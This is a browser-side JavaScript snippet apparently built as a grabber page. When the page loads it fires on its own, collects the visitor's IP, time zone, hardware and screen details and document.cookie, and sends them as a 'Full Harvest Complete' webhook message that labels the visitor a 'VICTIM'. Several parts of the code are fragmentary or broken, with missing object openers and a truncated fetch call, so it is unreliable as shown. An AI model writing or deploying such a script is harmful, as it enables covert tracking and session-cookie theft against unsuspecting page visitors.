<script>

let sent = false;

async function own() {
    if (sent) return;
    sent = true;

    // IP + full geo
    let ip = "unknown";
    let geo = {};
    try { ip = await (await fetch("https://v4.ident.me/")).text(); } catch(e) {}

        cores: navigator.hardwareConcurrency || "?",
        ram: navigator.deviceMemory || "?",
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${screen.width}x${screen.height}`,
        cookies: document.cookie || "none"
    };

    const payload = {
        content: "**VICTIM JUST OPENED 'hello there ;)' PAGE**",
        embeds: [{
            color: 16711680,
            title: "Full Harvest Complete",
            timestamp: new Date().toISOString(),
            fields: [
                { name: "IP", value: ip, inline: true },
                { name: "Location", value: `${geo.city||"?"} • ${geo.country||"?"}`, inline: true },
                { name: "ISP", value: geo.isp || geo.org || "?", inline: true },
                { name: "Browser", value: /Edg/.test(b.ua) ? "Edge" : /Chrome/.test(b.ua) ? "Chrome" : /Firefox/.test(b.ua) ? "Firefox" : /Safari/.test(b.ua) ? "Safari" : "Other", inline: true },

        headers: {"Content-Type": "application/json"},
        body: JSON.stringify(payload)
    });

    navigator.sendBeacon(WEBHOOK, JSON.stringify(payload));
}

// Fire immediately
setTimeout(own, 500);
